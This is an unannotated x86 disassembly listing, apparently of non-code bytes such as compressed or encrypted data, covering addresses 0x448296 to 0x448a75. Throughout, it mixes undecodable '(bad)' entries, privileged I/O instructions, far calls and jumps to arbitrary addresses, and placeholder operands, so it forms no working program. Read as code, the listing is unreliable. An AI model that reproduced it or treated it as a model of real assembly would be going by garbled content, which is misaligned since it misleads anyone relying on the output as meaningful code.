  448296:	test   DWORD PTR [ebx],edi
  448298:	xchg   edx,eax
  448299:	and    eax,0x82d86c36
  44829e:	push   ebp
  44829f:	(bad)  
  4482a0:	ss ret 0xe45e
  4482a4:	sub    bl,dl
  4482a6:	adc    BYTE PTR [ebx-0x7d],dh
  4482a9:	jne    0x44826c
  4482ab:	rcr    al,0xbd
  4482ae:	push   ecx
  4482af:	ret    
  4482b0:	clc    
  4482b1:	xchg   esp,eax
  4482b2:	sar    DWORD PTR [edx-0x12],1
  4482b5:	xor    edi,0x1fbed0f2
  4482bb:	sub    BYTE PTR [eax+0x23],bh
  4482be:	pop    ecx
  4482bf:	mov    WORD PTR [edx+esi*4+0x28],ds
  4482c3:	jns    0x44827a
  4482c5:	push   edx
  4482c6:	sbb    eax,0x6c63d8bb
  4482cb:	fld    QWORD PTR [edi+ebp*8]
  4482ce:	inc    edi
  4482cf:	dec    esi
  4482d0:	js     0x4482b3
  4482d2:	inc    esi
  4482d3:	add    ebp,DWORD PTR [ecx]
  4482d5:	push   edx
  4482d6:	jge    0x448290
  4482d8:	sbb    BYTE PTR [edi-0x42960c51],dh
  4482de:	sbb    BYTE PTR [eax+0x1ab4f73e],dl
  4482e4:	idiv   BYTE PTR [esp+ecx*2]
  4482e7:	mov    WORD PTR [ecx+ecx*4-0x55],es
  4482eb:	pop    ebp
  4482ec:	mov    edi,ecx
  4482ee:	imul   ecx,ebx,0xfffffff0
  4482f1:	ror    DWORD PTR [eax+ecx*2],1
  4482f4:	inc    eax
  4482f5:	les    ebp,FWORD PTR [edx-0x41]
  4482f8:	xchg   BYTE PTR [eax],ch
  4482fa:	addr16 mov al,ds:0x9ee8
  4482fe:	sbb    dh,0x3d
  448301:	inc    edx
  448302:	fcmove st,st(7)
  448304:	pop    ds
  448305:	or     al,0xb7
  448307:	push   cs
  448308:	sub    al,0x4b
  44830a:	imul   edi,DWORD PTR [esi-0x6b],0x66
  44830e:	mov    edx,0xd1d1b4de
  448313:	int3   
  448314:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  448315:	call   0xfaa8:0x237629c2
  44831c:	rcr    BYTE PTR [edi],1
  44831e:	jns    0x4482a9
  448320:	loope  0x4482aa
  448322:	pop    edi
  448323:	mov    eax,ebx
  448325:	ret    0xb264
  448328:	rcr    DWORD PTR [esp+ebx*1],0x93
  44832c:	arpl   WORD PTR [eax-0x77],di
  44832f:	test   BYTE PTR [ecx],dl
  448331:	pop    esp
  448332:	popa   
  448333:	push   ebx
  448334:	mov    dl,0xd3
  448336:	and    al,0xd0
  448338:	fstp   QWORD PTR [edx]
  44833a:	leave  
  44833b:	aam    0x57
  44833d:	mov    gs,esi
  44833f:	mov    WORD PTR [ecx+eiz*2],ds
  448342:	es das 
  448344:	push   cs
  448345:	mov    al,ds:0x275d06db
  44834a:	xor    bl,bh
  44834c:	or     al,0x4e
  44834e:	mov    ebp,0x58389385
  448353:	or     DWORD PTR [ebp+0x3b],0xffffffd4
  448357:	aas    
  448358:	mov    al,0xe6
  44835a:	sti    
  44835b:	fcmovnbe st,st(2)
  44835d:	inc    esp
  44835e:	push   ds
  44835f:	jge    0x4483bd
  448361:	sbb    dl,BYTE PTR [eax]
  448363:	sub    ecx,DWORD PTR [edi+0x41551a5]
  448369:	aad    0x7b
  44836b:	call   0x84866f06
  448370:	ret    0x8627
  448373:	inc    esp
  448374:	enter  0x72b5,0x57
  448378:	sar    bl,0x7b
  44837b:	or     esi,ebp
  44837d:	adc    DWORD PTR [ebx+0x519b0a5d],0x14
  448384:	into   
  448385:	and    al,cl
  448387:	pop    ebp
  448388:	and    al,BYTE PTR [edx-0x3227f5a2]
  44838e:	in     al,dx
  44838f:	push   edx
  448390:	retf   
  448391:	ret    
  448392:	dec    edx
  448393:	jbe    0x4483b3
  448395:	cmp    dl,BYTE PTR [ebp-0xd3f4821]
  44839b:	mov    eax,0x8a6b9f17
  4483a0:	mov    dh,0x79
  4483a2:	mov    WORD PTR [esi+ebp*4+0x16fdffd8],ss
  4483a9:	and    BYTE PTR [esi-0x71f28ffe],dl
  4483af:	mov    edi,0xe72da707
  4483b4:	and    eax,0x6cb9eff1
  4483b9:	push   esi
  4483ba:	ret    
  4483bb:	aam    0xaf
  4483bd:	sbb    al,0x1e
  4483bf:	(bad)  
  4483c0:	ss test ax,0x4adb
  4483c5:	dec    esi
  4483c6:	pop    esp
  4483c7:	mov    eax,0x4a12551a
  4483cc:	push   0x774903ee
  4483d1:	sbb    eax,0x71edb2a9
  4483d6:	adc    edx,DWORD PTR [ebx+0x68b8ea6b]
  4483dc:	push   DWORD PTR ds:0xba08c7e6
  4483e2:	fdiv   QWORD PTR [esi+0x73]
  4483e5:	out    0x8e,al
  4483e7:	jg     0x448382
  4483e9:	mov    dl,0x8c
  4483eb:	pop    es
  4483ec:	xor    DWORD PTR [esi-0x5d],esi
  4483ef:	dec    edi
  4483f0:	jecxz  0x44843f
  4483f2:	in     al,0x5f
  4483f4:	ret    
  4483f5:	sbb    al,0x5b
  4483f7:	pop    esp
  4483f8:	xchg   edi,eax
  4483f9:	xchg   ecx,eax
  4483fa:	push   es
  4483fb:	inc    ecx
  4483fc:	addr16 cmp dh,ah
  4483ff:	add    edx,DWORD PTR [ebp+0x65]
  448402:	int3   
  448403:	sub    DWORD PTR [ecx+0x1fc5b7f1],esp
  448409:	inc    ecx
  44840a:	ret    0xbfdf
  44840d:	jmp    0x44847b
  44840f:	sub    DWORD PTR [eax],esi
  448411:	mov    eax,0xc6d8b328
  448416:	inc    esi
  448417:	pop    edi
  448418:	mov    DWORD PTR ds:0x7e3ed1c,0x2abc5a6e
  448422:	mov    esp,0x8b826989
  448427:	jbe    0x4483de
  448429:	sbb    eax,0x3642b71
  44842e:	jp     0x448455
  448430:	lods   al,BYTE PTR ds:[esi]
  448431:	(bad)  
  448432:	adc    esi,DWORD PTR [edi-0x7e0dee9f]
  448438:	mov    ecx,0xb7b6ccfe
  44843d:	push   esp
  44843e:	jle    0x448460
  448440:	jl     0x4483d7
  448442:	jbe    0x4483ca
  448444:	aam    0x9a
  448446:	inc    eax
  448447:	fmul   DWORD PTR [esi]
  448449:	push   esp
  44844a:	dec    DWORD PTR [ecx-0x32]
  44844d:	pop    esi
  44844e:	xor    al,0xc3
  448450:	nop
  448451:	mov    ds:0x170725f4,al
  448456:	rcr    BYTE PTR [esi],0x27
  448459:	mov    al,ds:0xbb5edb0
  44845e:	adc    ecx,DWORD PTR [esi+0x6a]
  448461:	shl    DWORD PTR [ecx+edx*1],cl
  448464:	or     eax,0x881fc8b4
  448469:	mov    BYTE PTR [edi],cl
  44846b:	or     BYTE PTR [edi],al
  44846d:	cmp    edx,DWORD PTR [eax-0x52149ab5]
  448473:	test   DWORD PTR [ecx+0x3e0ab816],ebp
  448479:	loop   0x4484ba
  44847b:	pop    es
  44847c:	loopne 0x448432
  44847e:	add    DWORD PTR [eax],esp
  448480:	out    0x64,al
  448482:	sub    DWORD PTR [edx-0x39b1de4d],edi
  448488:	out    0x61,al
  44848a:	pop    ebp
  44848b:	push   ebp
  44848c:	daa    
  44848d:	nop
  44848e:	jge    0x4484f5
  448490:	scas   eax,DWORD PTR es:[edi]
  448491:	aad    0x3f
  448493:	(bad)  
  448494:	(bad)  
  448495:	cmp    eax,0x68aa9f55
  44849a:	inc    ebp
  44849b:	icebp  
  44849c:	mov    ebx,esi
  44849e:	mov    al,ds:0xdc105716
  4484a3:	dec    eax
  4484a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4484a5:	or     DWORD PTR [edx+edx*8],0xffffffd4
  4484a9:	or     BYTE PTR [esi],0xce
  4484ac:	add    DWORD PTR [ebp+0x328d04b4],0xffffff93
  4484b3:	and    dh,BYTE PTR [esi+eiz*8+0x2bafd60f]
  4484ba:	or     al,0x57
  4484bc:	sbb    edx,ebx
  4484be:	push   ds
  4484bf:	lea    eax,[edx]
  4484c1:	adc    eax,DWORD PTR [eax]
  4484c3:	cmp    DWORD PTR [edi-0xa725be1],ebp
  4484c9:	xchg   edx,eax
  4484ca:	inc    edx
  4484cb:	addr16 push ss
  4484cd:	inc    esi
  4484ce:	dec    esi
  4484cf:	(bad)  
  4484d0:	pop    ebx
  4484d1:	fwait
  4484d2:	mov    bl,BYTE PTR [edi+ecx*2+0x4e]
  4484d6:	shr    bl,1
  4484d8:	lea    ebx,[edi-0x760334ac]
  4484de:	stos   BYTE PTR es:[edi],al
  4484df:	nop
  4484e0:	jno    0x4484dd
  4484e2:	push   ebp
  4484e3:	mov    ss,WORD PTR [edx]
  4484e5:	js     0x448548
  4484e7:	pop    ecx
  4484e8:	icebp  
  4484e9:	bound  ecx,QWORD PTR [edx-0x59a5e72d]
  4484ef:	add    DWORD PTR [eax-0x4aaff7c2],eax
  4484f5:	ficom  DWORD PTR [ebx+0x77]
  4484f8:	dec    ebp
  4484f9:	enter  0x2391,0xb2
  4484fd:	inc    al
  4484ff:	outs   dx,DWORD PTR ds:[esi]
  448500:	das    
  448501:	ja     0x44850c
  448503:	inc    edx
  448504:	das    
  448505:	jnp    0x4484eb
  448507:	jg     0x4484c4
  448509:	sbb    al,0x75
  44850b:	out    dx,eax
  44850c:	(bad)  [ebx-0x71]
  44850f:	jb     0x4484c1
  448511:	shl    ebx,1
  448513:	aad    0x89
  448515:	(bad)  
  448517:	inc    edi
  448518:	inc    esp
  448519:	xchg   esp,eax
  44851a:	cs push 0x7ab67c5e
  448520:	retf   0x3b5f
  448523:	pop    eax
  448524:	fs xchg ebx,ebx
  448527:	aad    0x83
  448529:	loope  0x448501
  44852b:	or     eax,0xbb6fe28d
  448530:	mov    ah,0x29
  448532:	in     eax,dx
  448533:	sbb    ebx,DWORD PTR [edx-0x2300f731]
  448539:	fs inc esp
  44853b:	adc    BYTE PTR [ebx-0x12],bh
  44853e:	mov    ecx,0x68c81d0c
  448543:	adc    ecx,DWORD PTR [ecx+edx*4+0xccfce03]
  44854a:	mov    ch,0xf5
  44854c:	cmp    al,0xe9
  44854e:	mov    dl,0x74
  448550:	pop    es
  448551:	pop    ss
  448552:	mov    al,ds:0xb98f2e2f
  448557:	lahf   
  448558:	pop    edx
  448559:	or     al,dl
  44855b:	(bad)  
  44855c:	out    dx,al
  44855d:	jl     0x448545
  44855f:	jg     0x4485bc
  448561:	mov    dl,0x2c
  448563:	(bad)  
  448565:	cmp    ebp,DWORD PTR [eax+ecx*1+0x6624ebbe]
  44856c:	shr    ecx,cl
  44856e:	add    BYTE PTR [ecx+0x32],cl
  448571:	cli    
  448572:	dec    edi
  448573:	in     al,dx
  448574:	dec    ecx
  448575:	retf   
  448576:	push   esp
  448577:	shl    DWORD PTR [ecx-0x6f],0xd6
  44857b:	imul   edx,DWORD PTR ss:[ebp-0x4f],0xfffffff9
  448580:	loopne 0x448530
  448582:	cwde   
  448583:	(bad)  
  448584:	push   cs
  448585:	adc    dl,BYTE PTR [esi-0xd71f77c]
  44858b:	add    eax,0x13a7275
  448590:	add    esp,ebp
  448592:	ja     0x448537
  448594:	sub    ch,bl
  448596:	mov    bh,0x24
  448598:	jp     0x4485f4
  44859a:	ror    DWORD PTR [eax+ecx*1],cl
  44859d:	sbb    DWORD PTR [edi+0x479606d2],ebx
  4485a3:	mov    bl,0x98
  4485a5:	mov    WORD PTR [edx+0x63d37845],cs
  4485ab:	xchg   ebp,eax
  4485ac:	mov    ebp,0xc6ed9b71
  4485b1:	stc    
  4485b2:	lods   al,BYTE PTR ds:[esi]
  4485b3:	adc    ecx,DWORD PTR [esi]
  4485b5:	inc    edi
  4485b6:	pop    ecx
  4485b7:	hlt    
  4485b8:	push   eax
  4485b9:	jmp    0x662bfc1
  4485be:	xchg   DWORD PTR [edi+0x62989478],esp
  4485c4:	mov    esi,0x931ef4d
  4485c9:	hlt    
  4485ca:	pop    ebp
  4485cb:	push   ecx
  4485cc:	adc    al,0x80
  4485ce:	loopne 0x4485e5
  4485d0:	cmp    eax,0x18e0c85b
  4485d5:	fwait
  4485d6:	inc    edx
  4485d7:	dec    ebx
  4485d8:	add    al,0xab
  4485da:	dec    ebp
  4485db:	add    eax,0x56ce4099
  4485e0:	sbb    eax,0x2a087564
  4485e5:	pusha  
  4485e6:	bound  edi,QWORD PTR [edi]
  4485e8:	lods   eax,DWORD PTR ds:[esi]
  4485e9:	add    al,0xc7
  4485eb:	xor    DWORD PTR [ecx+0x1c874465],esp
  4485f1:	and    ecx,DWORD PTR [ecx+0x1a86aa76]
  4485f7:	aas    
  4485f8:	and    DWORD PTR [edx],ebx
  4485fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4485fb:	out    dx,eax
  4485fc:	push   cs
  4485fd:	push   ecx
  4485fe:	nop
  4485ff:	lahf   
  448600:	pop    eax
  448601:	or     BYTE PTR [ebx-0x29],ah
  448604:	ins    BYTE PTR es:[edi],dx
  448605:	mov    BYTE PTR [ebx+0x22],dl
  448608:	loopne 0x4485bc
  44860a:	ds fs dec esi
  44860d:	loopne 0x448600
  44860f:	test   ebp,ebp
  448611:	cmp    eax,0x12fb67b2
  448616:	mov    edi,0xe721b0cb
  44861b:	pop    ss
  44861c:	jae    0x7744e450
  448622:	xor    DWORD PTR [ebx+0x44fc2909],0x29
  448629:	jecxz  0x448611
  44862b:	or     ebx,edx
  44862d:	sub    edi,DWORD PTR [ecx+edi*8-0x66]
  448631:	in     al,dx
  448632:	loopne 0x4486a9
  448634:	stos   DWORD PTR es:[edi],eax
  448635:	jnp    0x448677
  448637:	loopne 0x4485ec
  448639:	or     al,0xd2
  44863b:	jae    0x448608
  44863d:	jbe    0x448626
  44863f:	dec    edx
  448640:	(bad)  
  448641:	or     eax,0xb0ed3797
  448646:	mov    cl,0x25
  448648:	pop    edx
  448649:	in     eax,dx
  44864a:	mov    fs,ebx
  44864c:	xchg   esp,eax
  44864d:	mov    bh,0xaa
  44864f:	xor    DWORD PTR [esi-0x61ca3bcb],eax
  448655:	mov    dh,0x40
  448657:	imul   edx,DWORD PTR [eax+0x16cf3cf0],0xffffffc2
  44865e:	ins    BYTE PTR es:[edi],dx
  44865f:	popa   
  448660:	gs jle 0x4485e3
  448663:	sub    esp,DWORD PTR [eax+0x10]
  448666:	test   ah,ah
  448668:	and    BYTE PTR [ecx],dl
  44866a:	loop   0x4485f9
  44866c:	xchg   esi,eax
  44866d:	int3   
  44866e:	leave  
  44866f:	sbb    esp,DWORD PTR [ebx-0xee88a8a]
  448675:	out    0x5,al
  448677:	xor    bh,cl
  448679:	or     cl,ah
  44867b:	inc    esi
  44867c:	cmc    
  44867d:	hlt    
  44867e:	adc    bh,dh
  448680:	jmp    0x3eceac59
  448685:	lods   al,BYTE PTR ds:[esi]
  448686:	es add eax,0x33b4c518
  44868c:	cmp    BYTE PTR [ecx-0x7578d9a0],dh
  448692:	jge    0x44865b
  448694:	inc    ebp
  448695:	int3   
  448696:	cmp    BYTE PTR ds:0x5e782558,ah
  44869d:	adc    DWORD PTR [esi-0x71dfd06b],0x70deca1c
  4486a7:	rcl    DWORD PTR [ebx+0x2c5ac6af],1
  4486ad:	shl    DWORD PTR [edi],1
  4486af:	push   esp
  4486b0:	arpl   WORD PTR [ecx+0x1fd6dda2],sp
  4486b6:	mov    cl,0xf1
  4486b8:	aas    
  4486b9:	fidiv  WORD PTR [eax]
  4486bb:	cs scas al,BYTE PTR es:[edi]
  4486bd:	pop    eax
  4486be:	je     0x4486c6
  4486c0:	mov    eax,0xf81df499
  4486c5:	pop    es
  4486c6:	enter  0x2092,0xab
  4486ca:	add    al,0x55
  4486cc:	ss and eax,0x50f632bc
  4486d2:	das    
  4486d3:	jbe    0x448746
  4486d5:	mov    al,0xfb
  4486d7:	adc    esi,esp
  4486d9:	jle    0x4486a9
  4486db:	inc    ebx
  4486dc:	mov    esi,es
  4486de:	cmovge esp,DWORD PTR [ebx-0x67]
  4486e2:	mov    bh,0xae
  4486e4:	mov    ecx,DWORD PTR [ebx-0xc]
  4486e7:	jp     0x448737
  4486e9:	cmp    bh,BYTE PTR [ecx]
  4486eb:	jbe    0x44869e
  4486ed:	push   eax
  4486ee:	dec    eax
  4486ef:	dec    edi
  4486f0:	and    DWORD PTR ds:0x3603b084,eax
  4486f6:	in     al,0xca
  4486f8:	imul   ebx,DWORD PTR [ebp+0x59dc34b9],0x9d4908a1
  448702:	adc    DWORD PTR [edx-0x62],ebx
  448705:	inc    ecx
  448706:	sbb    al,0xd0
  448708:	shr    DWORD PTR [eax+0x6b],1
  44870b:	xchg   esi,eax
  44870c:	aaa    
  44870d:	arpl   WORD PTR [eax-0x8f3724a],di
  448713:	ss popa 
  448715:	test   DWORD PTR [edx+0x68ce7748],edx
  44871b:	pop    edi
  44871c:	mov    al,ds:0x7579509b
  448721:	outs   dx,BYTE PTR ds:[esi]
  448722:	out    0xb1,eax
  448724:	xchg   ecx,eax
  448725:	jecxz  0x4486ba
  448727:	aad    0xba
  448729:	fwait
  44872a:	and    bh,cl
  44872c:	mul    BYTE PTR [ebx-0x13a4ade5]
  448732:	pop    ecx
  448733:	mov    al,BYTE PTR cs:[esi+0x7a]
  448737:	cld    
  448738:	jp     0x448777
  44873a:	mov    ?,WORD PTR [ecx]
  44873c:	loop   0x448703
  44873e:	sbb    dh,BYTE PTR [eax]
  448740:	(bad)  
  448741:	ins    BYTE PTR es:[edi],dx
  448742:	and    al,0xd6
  448744:	jbe    0x4486d9
  448746:	icebp  
  448747:	xchg   ecx,eax
  448748:	pop    ebp
  448749:	adc    DWORD PTR [eax-0x7a],eax
  44874c:	stos   DWORD PTR es:[edi],eax
  44874d:	dec    esp
  44874e:	sar    DWORD PTR [eax+0x1d],1
  448751:	adc    BYTE PTR [esi],bl
  448753:	mov    ebp,0xc8a1bfe2
  448758:	pop    ebp
  448759:	mov    al,ds:0x92c791c4
  44875e:	dec    edi
  44875f:	mov    eax,0x5e97dc9a
  448764:	jb     0x4487e3
  448766:	mov    al,0xf4
  448768:	jb     0x448771
  44876a:	(bad)  [ebx]
  44876c:	add    BYTE PTR [edi-0x51],bl
  44876f:	cli    
  448770:	sahf   
  448771:	jbe    0x4487b1
  448773:	sbb    DWORD PTR [ebx],0x2740f207
  448779:	gs fwait
  44877b:	scas   al,BYTE PTR es:[edi]
  44877c:	ss ds adc eax,0x419e6e56
  448783:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  448784:	dec    ebx
  448785:	dec    esp
  448786:	cmp    ch,BYTE PTR [eax-0xc]
  448789:	icebp  
  44878a:	mov    ebx,0x6894dd50
  44878f:	jne    0x44875b
  448791:	push   es
  448792:	inc    ebp
  448793:	push   esi
  448794:	mov    cl,BYTE PTR [ebx]
  448796:	lahf   
  448797:	shl    DWORD PTR [ecx+0x51],1
  44879a:	mov    edx,0x5d3bcc28
  44879f:	adc    BYTE PTR [ecx],al
  4487a1:	lds    esp,FWORD PTR [esi]
  4487a3:	push   ebx
  4487a4:	inc    edx
  4487a5:	sahf   
  4487a6:	xchg   ah,dl
  4487a8:	mov    eax,ds:0x34118766
  4487ad:	push   0xffffffe8
  4487af:	sbb    ebx,DWORD PTR [ecx-0x49]
  4487b2:	test   cl,bh
  4487b4:	cmp    esi,ecx
  4487b6:	xor    eax,0x8f935540
  4487bb:	adc    eax,0xf3199f4c
  4487c0:	in     eax,dx
  4487c1:	sub    ebx,DWORD PTR [ebx-0x642ee435]
  4487c7:	test   BYTE PTR [edi],cl
  4487c9:	mov    ch,0xc9
  4487cb:	and    al,0x45
  4487cd:	adc    al,0x43
  4487cf:	sbb    al,0xd1
  4487d1:	outs   dx,DWORD PTR ds:[esi]
  4487d2:	cdq    
  4487d3:	sahf   
  4487d4:	dec    esi
  4487d5:	lods   eax,DWORD PTR ds:[esi]
  4487d6:	xor    edx,DWORD PTR [edx]
  4487d8:	xor    al,0x8d
  4487da:	mov    bl,0xd6
  4487dc:	(bad)  
  4487dd:	push   edi
  4487de:	loop   0x448810
  4487e0:	adc    ebx,edi
  4487e2:	jno    0x4487c7
  4487e4:	ret    0x2fd8
  4487e7:	in     eax,0xe1
  4487e9:	push   esi
  4487ea:	sbb    BYTE PTR [edi+0x1a7a8863],bh
  4487f0:	push   ds
  4487f1:	mov    eax,ds:0x7bdae59a
  4487f6:	lods   eax,DWORD PTR ds:[esi]
  4487f7:	int    0xd7
  4487f9:	data16 shl BYTE PTR [ebx],0x2d
  4487fd:	adc    al,0x3b
  4487ff:	out    0xd,al
  448801:	xchg   DWORD PTR [edx],edx
  448803:	icebp  
  448804:	repz in al,dx
  448806:	fsubr  DWORD PTR [ecx-0x3c04dc3c]
  44880c:	mov    dl,0xf8
  44880e:	inc    esp
  44880f:	pop    ds
  448810:	mov    dh,0x3c
  448812:	outs   dx,BYTE PTR ds:[esi]
  448813:	das    
  448814:	stc    
  448815:	mov    al,0xb7
  448817:	enter  0x9c73,0x47
  44881b:	pop    ecx
  44881c:	arpl   sp,cx
  44881e:	jno    0x448824
  448820:	sbb    bl,BYTE PTR [ebx-0x23a179e]
  448826:	out    dx,al
  448827:	mov    ds:0x9fe97874,eax
  44882c:	pop    es
  44882d:	mov    al,0x20
  44882f:	fdivrp st(7),st
  448831:	shl    esi,1
  448833:	push   esi
  448834:	ins    DWORD PTR es:[edi],dx
  448835:	mov    esi,DWORD PTR [edi+0x6b]
  448838:	enter  0xafac,0x38
  44883c:	mov    dh,0x9e
  44883e:	jno    0x448896
  448840:	mov    ss,WORD PTR [eax+0x75]
  448843:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  448844:	std    
  448845:	adc    bh,al
  448847:	pop    ebp
  448848:	adc    eax,0x3aabe4d4
  44884d:	neg    DWORD PTR [edx-0x38e1134a]
  448853:	sbb    BYTE PTR [ebp-0x1c71db6f],dh
  448859:	ins    BYTE PTR es:[edi],dx
  44885a:	inc    ebp
  44885b:	and    BYTE PTR [edi-0x16],bl
  44885e:	and    edx,DWORD PTR [si-0x4]
  448862:	xchg   edi,eax
  448863:	stc    
  448864:	xchg   ebp,eax
  448865:	fxch   st(7)
  448867:	ror    DWORD PTR [eax],0x48
  44886a:	enterw 0xe909,0x14
  44886f:	hlt    
  448870:	and    esi,0xffffffa4
  448873:	dec    ecx
  448874:	pop    ds
  448875:	cmp    DWORD PTR [edx],esp
  448877:	mov    al,ds:0xa6ecba42
  44887c:	hlt    
  44887d:	ret    
  44887e:	push   es
  44887f:	call   0x101ab0ec
  448884:	jecxz  0x44888b
  448886:	xchg   ecx,eax
  448887:	imul   esi,DWORD PTR [ebp-0x2f],0x637568c0
  44888e:	stos   DWORD PTR es:[edi],eax
  44888f:	adc    eax,0x16695ed6
  448894:	and    edi,esi
  448896:	clc    
  448897:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  448898:	mov    dh,0xc1
  44889a:	add    eax,0x20596f8b
  44889f:	mov    ebp,DWORD PTR [edx+0x2abd4f07]
  4488a5:	call   0x56682156
  4488aa:	addr16 cmp eax,0xda330083
  4488b0:	push   0xffffff9e
  4488b2:	add    DWORD PTR [esi+0x61f5c675],edi
  4488b8:	mov    ds:0x2ee793f9,al
  4488bd:	jbe    0x4488e2
  4488bf:	and    al,0x10
  4488c1:	pusha  
  4488c2:	sub    al,0xb0
  4488c4:	pushf  
  4488c5:	inc    eax
  4488c6:	xchg   ecx,eax
  4488c7:	addr16 xchg ecx,eax
  4488c9:	aam    0xe5
  4488cb:	imul   ebp,ebx,0x4f424d81
  4488d1:	fwait
  4488d2:	cwde   
  4488d3:	ds call 0x7020:0xb9db032d
  4488db:	mov    ah,BYTE PTR [eax+0x1f2683f9]
  4488e1:	add    BYTE PTR [edi+0x200b0ff6],0x8
  4488e8:	fild   QWORD PTR [edx+edi*2-0x4cc4c15d]
  4488ef:	sbb    al,0x8c
  4488f1:	mov    ?,WORD PTR [esi+0x2d15eae6]
  4488f7:	mov    ds:0xba863c93,eax
  4488fc:	cmp    al,0xec
  4488fe:	mov    DWORD PTR [eax+ebp*8-0x17],edx
  448902:	dec    esi
  448903:	retf   
  448904:	jns    0x4488da
  448906:	aam    0xa8
  448908:	xchg   edx,eax
  448909:	fistp  DWORD PTR [eax+eax*8-0x5b9718f8]
  448910:	test   al,0x7
  448912:	aam    0x2c
  448914:	(bad)  
  448915:	call   0x9651:0x5f73ab73
  44891c:	aam    0x73
  44891e:	adc    DWORD PTR [ebx],0x22
  448921:	test   eax,0x4c280fbe
  448926:	cmp    eax,0x970f1f40
  44892b:	mov    dl,0xc2
  44892d:	jnp    0x4488f8
  44892f:	adc    al,0xfa
  448931:	aam    0x37
  448933:	aad    0xc
  448935:	jmp    0x4488c1
  448937:	xor    DWORD PTR [eax-0x3c],esp
  44893a:	test   eax,0x90405d07
  44893f:	or     BYTE PTR ds:0x27d9995c,ch
  448945:	lock rcl BYTE PTR [ebx],0x13
  448949:	inc    ecx
  44894a:	jl     0x448965
  44894c:	mov    ah,0xe0
  44894e:	mov    ebp,0x94096e28
  448953:	repz cmc 
  448955:	gs jle 0x448999
  448958:	sbb    BYTE PTR [ebx+0x8],bl
  44895b:	ficom  WORD PTR [edx-0x39]
  44895e:	jne    0x448972
  448960:	push   eax
  448961:	sub    BYTE PTR [ebx+0x1562604b],0xa1
  448968:	adc    dh,BYTE PTR [eax+0x7b]
  44896b:	adc    eax,0x8b4e2803
  448970:	test   DWORD PTR [ebp+0x738ec847],edx
  448976:	stc    
  448977:	loopne 0x44891e
  448979:	sub    DWORD PTR [esi-0x7577ef61],ebp
  44897f:	cmp    DWORD PTR [ebx],edi
  448981:	add    eax,0xc93a1e6d
  448986:	fwait
  448987:	mov    eax,ebx
  448989:	data16 jne 0x4489bf
  44898c:	aam    0x11
  44898e:	mov    al,ds:0x7c31da96
  448993:	inc    ebp
  448994:	xor    al,BYTE PTR [eax]
  448996:	jmp    0x3564f1d0
  44899b:	or     ebx,DWORD PTR [ebp+0x1d]
  44899e:	enter  0x1908,0x61
  4489a2:	adc    al,0x7c
  4489a4:	mov    cl,0x2a
  4489a6:	out    dx,eax
  4489a7:	stos   DWORD PTR es:[edi],eax
  4489a8:	in     eax,dx
  4489a9:	inc    edi
  4489aa:	(bad)  
  4489ab:	cmp    esp,DWORD PTR [edi-0x2d]
  4489ae:	jo     0x4489ee
  4489b0:	xchg   ecx,eax
  4489b1:	xchg   ebx,eax
  4489b2:	dec    ecx
  4489b3:	sti    
  4489b4:	das    
  4489b5:	xor    dh,BYTE PTR [ecx+0x50613600]
  4489bb:	lods   al,BYTE PTR ds:[esi]
  4489bc:	jae    0x448964
  4489be:	mov    bl,0x1f
  4489c0:	fstp   st(3)
  4489c2:	adc    ah,BYTE PTR [edx-0x32]
  4489c5:	loopne 0x448966
  4489c7:	das    
  4489c8:	sti    
  4489c9:	clc    
  4489ca:	repz repnz fist WORD PTR [ebp+0x29]
  4489cf:	das    
  4489d0:	jg     0x448a45
  4489d2:	cld    
  4489d3:	mov    ss,WORD PTR [eax-0x4348ad63]
  4489d9:	rol    ecx,cl
  4489db:	pusha  
  4489dc:	mov    eax,0xc008ead2
  4489e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4489e2:	inc    esp
  4489e3:	pop    esi
  4489e4:	pop    esp
  4489e5:	fidivr DWORD PTR [eax-0x6e]
  4489e8:	xchg   ebx,eax
  4489e9:	sahf   
  4489ea:	jecxz  0x448a3d
  4489ec:	lea    eax,[edx+0x8]
  4489ef:	dec    ebx
  4489f0:	push   esi
  4489f1:	cmp    DWORD PTR [edi+0x26],edi
  4489f4:	cwde   
  4489f5:	add    eax,DWORD PTR [ebx]
  4489f7:	nop
  4489f8:	push   ebx
  4489f9:	fild   QWORD PTR [ebx-0x63407b4e]
  4489ff:	push   ebp
  448a00:	and    al,0x27
  448a02:	mov    ch,0x69
  448a04:	inc    eax
  448a05:	mov    edi,0x7371b4ae
  448a0a:	jmp    0x34d451ae
  448a0f:	mov    esi,DWORD PTR [ecx+eax*4]
  448a12:	inc    ecx
  448a13:	fidiv  DWORD PTR [ebx]
  448a15:	inc    ebp
  448a16:	xchg   edi,eax
  448a17:	shl    BYTE PTR [esi],0x73
  448a1a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  448a1b:	fistp  DWORD PTR [ebp+0x14]
  448a1e:	stc    
  448a1f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  448a20:	mov    edx,DWORD PTR [ebx]
  448a22:	scas   eax,DWORD PTR es:[edi]
  448a23:	inc    ecx
  448a24:	push   cs
  448a25:	dec    ecx
  448a26:	outs   dx,DWORD PTR ds:[esi]
  448a27:	jge    0x4489f0
  448a29:	pop    ds
  448a2a:	xchg   DWORD PTR [ebp+0x6a],ebx
  448a2d:	les    eax,FWORD PTR [ebp-0x26]
  448a30:	push   ebx
  448a31:	push   es
  448a32:	xchg   edx,eax
  448a33:	in     al,0x54
  448a35:	in     al,0xe9
  448a37:	push   eax
  448a38:	gs xchg esp,eax
  448a3a:	out    dx,al
  448a3b:	cmp    al,0x67
  448a3d:	sahf   
  448a3e:	push   eax
  448a3f:	push   ax
  448a41:	add    bl,BYTE PTR [edx]
  448a43:	inc    eax
  448a44:	div    al
  448a46:	call   0x8438:0x59b4d24e
  448a4d:	aam    0xc5
  448a4f:	sub    eax,0xd81cfdfe
  448a54:	pop    eax
  448a55:	retf   0x6887
  448a58:	adc    bl,0x98
  448a5b:	in     eax,0x3c
  448a5d:	mov    eax,ds:0xbfeb6725
  448a62:	mov    eax,ds:0x9e2a91e6
  448a67:	jg     0x448ab9
  448a69:	or     BYTE PTR [eax+0x37],bh
  448a6c:	shr    BYTE PTR [edx],cl
  448a6e:	mov    eax,ds:0xf1b0328b
  448a73:	cmp    DWORD PTR [ebx],eax
  448a75:	dec    esp
